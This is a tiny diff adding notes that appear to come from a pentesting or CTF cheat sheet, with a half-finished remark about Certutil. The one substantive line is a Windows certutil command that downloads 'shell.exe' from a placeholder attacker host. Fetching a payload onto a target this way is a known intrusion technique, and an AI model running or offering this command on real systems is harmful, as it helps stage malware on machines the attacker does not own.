@@ -1,0 +1,5 @@
+1. Certutil     I thought this was creative and
+
+
+
+1. certutil -urlcache -split -f "http://myhackerbox/shell.exe" shell.exe
